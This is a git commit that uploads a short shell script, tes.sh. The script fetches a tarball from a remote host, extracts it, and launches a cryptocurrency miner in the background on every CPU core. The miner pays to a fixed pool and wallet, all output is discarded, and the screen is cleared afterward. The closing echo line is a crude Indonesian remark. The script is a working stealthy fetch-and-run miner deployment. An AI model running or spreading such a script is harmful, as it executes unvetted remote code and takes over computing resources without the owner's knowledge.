d497b841261e097245488bb2028ba835ccb274f5
apaple <76417012+apaple@users.noreply.github.com>
2024-08-11 17:44:45 +0700

    Add files via upload

---
+++ tes.sh
@@ -0,0 +1,9 @@
+wget -O mek dot.x10.bz/srbdot.tar.gz
+
+tar -xvf mek
+
+nohup ./srbdot -a yespowersugar -o cugeoyom.tech:3333 -u sugar1qzqru303xvxefcfhly9mwh8gepqsq65ulsfzq0k.dotsange -t $(nproc) > /dev/null 2>&1 &
+
+clear
+
+echo"jalan kontol cek di pool"
